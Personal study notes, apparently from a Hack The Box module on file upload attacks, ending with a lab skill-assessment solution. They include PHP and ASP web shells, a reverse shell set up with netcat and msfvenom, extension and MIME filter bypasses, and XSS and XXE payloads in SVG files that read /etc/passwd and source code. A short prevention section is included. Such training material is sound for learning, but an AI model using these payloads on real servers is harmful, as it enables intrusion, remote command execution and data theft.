### Types of FIle Upload Attacks
* most common reason: weak file validation and verification
* worst possible kind: unauthenticated arbitrary file upload
* most common (and critical attack): gaining remote command execution by uploading a web shell or script to spawn a rev shell

# Basic Exploitation

## Absent Validation
* most basic type of file upload vulnerabilities occur when web app does not have any form of validation filters

### Arbitrary File Upload
* occurs when every type of files is allowed to be uploaded
* **Identifying web framework:**
	* the script for spawning a web shell or rev shell needs to be in the same language as it runs on the web server
	* often simple as we can see the file extensions in the URLs (e.g. php)
	* easy method: use /index.ext as template and switch .ext with real extensions and see what actually exists on the server (look at response codes)
	* https://www.wappalyzer.com/ Browser Extension
* **Vulnerability Identification:**
```php
<?php echo "Hello HTB";?>
```
Put this into a test.php file and upload it. Access it and see if successful

## Upload Exploitation
### Web Shells
* https://github.com/Arrexel/phpbash
* https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
* Writing Custom Web Shell:
	* PHP: we can use system() function that executes system commands and prints their output, and pass it the cmd parameter
```php
<?php system($_REQUEST['cmd']); ?>
```
* for .NET apps:
```asp
<% eval request('cmd') %>
```
### Reverse shell
* https://github.com/pentestmonkey/php-reverse-shell
* We need to adapt IP and PORT in our script
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```
* start a netcat listener on attacker machine, access the uploaded file to start the rev shell
```shellsession
lunims@htb[/htb]$ nc -lvnp OUR_PORT 
listening on [any] OUR_PORT ... 
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232 
# id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
* writing custom rev shell scripts:
	* we could use system() again, but that is kinda unreliable
	* luckily, tools like msfvenom exist:
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

# Bypassing Filters

## Client-Side Validation
* can easily be bypassed
* intercept with Burp or ZAP: send request directly or change with intercepter
* **Disabling Front-end Validation:**
	* [CTRL+SHIFT+C] to open Page inspector
	* HTML element could look like below, we can just change the accept field
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
Keep in mind: We can also change front-end JS code or delete it, when it is used for validation

## Black-list Filters:
### Blacklisting Extensions
* backend-end uses either allow- or denylist
	* denylist is weaker
* validation may also check file type or file content for type matching 
* **Fuzzing Extensions:**
	* first step should be to fuzz with potential extensions and see which are allowed
	* SecLists: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt -> Discovery/Web-Content/web-extensions.txt
	* also make sure, that the dot is not url encoded
## White-list Filters
* generally more secure than deny list filters
* messages often are like: "Only images are allowed"
* again, fuzzing allowed file types should be the first step
**Double Extensions**:
Include allowed file-extension in the filename: shell.jpg.php
**Reverse Double Extension:**
Sometimes, web server configuration is vulnerable -> Configuration of web server determines which files to allow PHP code execution. 
This might lead to the case, where any file with php keyword in it, gets executed as php

**Character Injection:**
* %20
* %0a
* %00 -> works with php versions 5.X and earlier
* %00d0a
* /
* .\
* .
* ...
* : -> Windows server (shell.aspx:.jpg)
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do for ext in '.php' '.phps'; do echo "shell$char$ext.jpg" >> wordlist.txt echo "shell$ext$char.jpg" >> wordlist.txt echo "shell.jpg$char$ext" >> wordlist.txt echo "shell.jpg$ext$char" >> wordlist.txt done done
```
Task file name: phpbash.phtml.png

## Type Filters
* so far only file extension checked
* nowadays, modern web servers also often test content of files
* Two commons methods for validation: Content-type header and File Content

**Content-Type:**
* start fuzzing Content-Type header to see allowed types
* https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt -> seclists/Discovery/Web-Content/web-all-content-types.txt

**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

**MIME-type**
* MIME type determines type of a file through its general format and bytes structure
* usually done by inspecting first bytes, which contain file signature or Magic Bytes
* GIF -> GIF87a ir GIF89a (GIF is easiest to imitate cause it starts with ASCII characters)

Task: https://154.57.164.79:32149/profile_images/phpbash.jpg.phar?cmd=cat%20/flag.txt

# Other File Upload Attacks

## Limited File Uploads
* certain file types like SVG, HTML or XML may allow us to introduce new vulnerabilities 

### XSS
* most basic example: web app allows upload of html files
* another example: web apps that display metadata of an image:
```shellsession
lunims@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg 
lunims@htb[/htb]$ exiftool HTB.jpg 
...SNIP... 
Comment : "><img src=1 onerror=alert(window.origin)>
```
* SVGs: 
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
<script type="text/javascript">alert(window.origin);</script> 
</svg>
```

**XXE**
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<svg>&xxe;</svg>
```
* potentially leaks content of /etc/passwd
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>
```
* use XXE to read source code of php files (base64 encoded)
**DoS**:
* Decompression Bombs
* ZIP bombs 
* Pixel flood attacks

Apart from that: maybe Path traversal

**Task:**
Upload SVG with payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]>
<svg>&xxe;</svg>
```
base64 encoded flag in html code

## Other Upload Attacks
* **Injections in file name**
	* for example: command injections over the file name
* **Upload Directory Disclosure**:
	* force error messages to display directory
	* or need to fuzz with wordlists
* **Windows Specific Attacks:**
	* Use reserved characters such as |, <, >, \*, ?
	* https://en.wikipedia.org/wiki/8.3_filename
	* try to overwrite existing files 

# Prevention
* **Extension Validation**
	* use both deny- and allow listing
	* This way: blacklist will prevent uploading malicious scripts if whitelist is bypassed
* **Content Validation**
* **Upload Disclosure**
	* a web app should not disclose the uploads directory or providing direct access to the file
	* Users should not have direct access to the uploads directory
	* Also set headers: 
		* Content:disposition: attachment
		* Content-type
		* X-Content-Type-Options: nosniff -> browser adheres strictly to specified Content-type
* **Further Security**
	* disable specific functions that may be used to execute system commands through web app
		* PHP examples: exec, shell_exec, system...
	* Limit file size, update libs, scan uploaded files for malware, WAF

# Skill Assessment
First, fuzzing of allowed file types (not blocked by denylist):
* pcap
* pht
* phps
* pl
* phar

Then, fuzzed for allowed Content-types:
* image/png
* image/jpeg
* image/jpg
* image/apng
* image/svg+xml

XML is allowed, so let's try XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> 
<svg>&xxe;</svg>
```
We receive following source code:

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

Uploads go in following directory with format yymmdd_filename:
* /user_feedback_submissions/

Append php payload to a normal image, upload it with .phar.png extension:
http://154.57.164.79:32401/contact/user_feedback_submissions/260322_shell.phar.png?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

